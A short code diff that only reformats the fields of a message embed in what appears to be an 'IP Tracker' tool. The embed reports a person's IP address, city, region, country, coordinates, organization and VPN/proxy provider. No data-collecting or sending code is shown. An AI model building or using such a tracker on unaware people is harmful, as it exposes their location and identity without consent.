@@ -28,13 +28,20 @@
                     color: 000000,
                     fields: [
                         { name: "📌 IP Address", value: info.ip || 'N/A', inline: false },
-                        { 
+                        {
                             name: "📍 Location", 
-                            value: `**City:** ${info.city || 'N/A'}\n**Region:** ${info.region || 'N/A'}\n**Country:** ${info.country || 'N/A'}\n**Coordinates:** ${info.loc || 'N/A'}`, 
+                            value: 
+                                "**City:**\u2003\u2003\u2003" + (info.city || 'N/A') +  
+                                "\n**Region:**\u2003\u2003" + (info.region || 'N/A') +  
+                                "\n**Country:**\u2003\u2002" + (info.country || 'N/A') +  
+                                "\n**Coordinates:** " + (info.loc || 'N/A'), 
                             inline: false 
                         },
-                        { name: "🏢 Organization", value: info.org || 'N/A', inline: false },
-
+                        { 
+                            name: "🏢 Organization", 
+                            value: "**Org:**\u2003\u2003\u2003" + (info.org || 'N/A'), 
+                            inline: false 
+                        },
                         { 
                             name: "🔒 Privacy Details", 
                             value: 
@@ -45,6 +52,7 @@
                                 "\n**Provider:**\u2003" + (info.privacy?.service || 'N/A'), 
                             inline: false 
                         }
+
                     ],
                     footer: { text: "IP Tracker | By 3am.unknown" },
                     timestamp: new Date()
